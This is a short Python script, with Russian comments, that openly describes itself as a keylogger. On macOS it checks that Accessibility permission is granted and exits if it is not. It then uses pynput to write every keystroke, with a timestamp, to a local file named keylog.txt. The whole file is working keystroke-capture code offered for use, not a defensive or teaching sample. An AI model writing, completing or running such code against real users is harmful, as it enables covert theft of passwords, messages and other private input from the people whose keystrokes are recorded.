import os
import sys
import time
from pynput import keyboard

# ✅ Только для macOS: Проверка прав доступа к Accessibility
def is_accessibility_enabled_mac():
    try:
        # macOS-specific check using AppleScript
        import subprocess
        script = '''
        tell application "System Events"
            return UI elements enabled
        end tell
        '''
        result = subprocess.run(['osascript', '-e', script], 
capture_output=True, text=True)
        return result.stdout.strip().lower() == 'true'
    except Exception as e:
        print(f"[!] Could not verify accessibility access: {e}")
        return False

# 🚫 Остановить, если доступ не дан
if sys.platform == "darwin":  # macOS
    if not is_accessibility_enabled_mac():
        print("[❌] Accessibility access is NOT enabled for this app.")
        print("Go to System Settings > Privacy & Security > Accessibility and enable access for Terminal.")
        sys.exit(1)

# ✅ Кейлоггер начинается здесь
def on_press(key):
    try:
        with open("keylog.txt", "a") as log:
            log.write(f"{time.strftime('%a %b %d %H:%M:%S %Y')} - {key.char}\n")
    except AttributeError:
        with open("keylog.txt", "a") as log:
            log.write(f"{time.strftime('%a %b %d %H:%M:%S %Y')} - {key}\n")


print("Keylogger started. Logging to keylog.txt...")

with keyboard.Listener(on_press=on_press) as listener:
    listener.join()

